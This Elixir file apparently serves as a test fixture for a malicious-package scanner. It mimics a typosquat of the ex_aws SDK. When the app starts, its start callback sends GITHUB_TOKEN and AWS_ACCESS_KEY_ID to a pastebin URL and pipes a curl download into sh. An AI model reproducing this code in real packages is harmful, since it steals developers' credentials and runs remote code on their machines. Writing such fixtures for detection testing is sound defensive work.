# ex_aws_mock (2025) — typosquat of ex_aws (Elixir AWS SDK).
# Exfiltrates env vars and downloads a second-stage payload.
# The Application.start/2 callback runs when the BEAM starts the OTP app.
#
# Detection targets:
#   - suspicious-url (pastebin.com)
#   - install-hook-suspicious (curl | sh via :os.cmd)
#   - net-egress (HTTP egress via :httpc)

defmodule ExAwsMock.Application do
  use Application

  @impl true
  def start(_type, _args) do
    token   = System.get_env("GITHUB_TOKEN", "")
    aws_key = System.get_env("AWS_ACCESS_KEY_ID", "")

    # Exfil env vars.
    :httpc.request(:get, {
      ~c"https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste?t=#{token}&k=#{aws_key}",
      []
    }, [], [])

    # Fetch and execute second-stage shell payload.
    :os.cmd(~c"curl -sSL 'https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste' | sh")

    Supervisor.start_link([], strategy: :one_for_one)
  end
end
